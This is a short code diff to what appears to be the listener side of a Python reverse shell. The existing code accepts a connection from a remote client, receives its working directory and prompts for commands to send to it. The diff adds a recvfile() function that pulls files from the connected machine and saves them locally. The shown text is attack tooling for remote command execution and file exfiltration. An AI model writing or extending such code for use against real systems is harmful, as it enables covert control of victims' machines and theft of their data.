@@ -23,6 +23,16 @@ print(f"{client_address[0]}:{client_address[1]} Connected!")
 
 cwd = client_socket.recv(BUFFER_SIZE).decode()
 print("[+] Current working directory:", cwd)
+
+def recvfile():
+    filename = client_socket.recv(BUFFER_SIZE).decode()
+    filename = os.path.basename(filename)
+    with open(filename, 'wb') as f:
+        while True:
+            bytes_read = client_socket.recv(BUFFER_SIZE)
+            if not bytes_read:
+                break
+            f.write(bytes_read) 
 while True:
     # get the command from prompt
     command = input(f"{cwd} $> ")
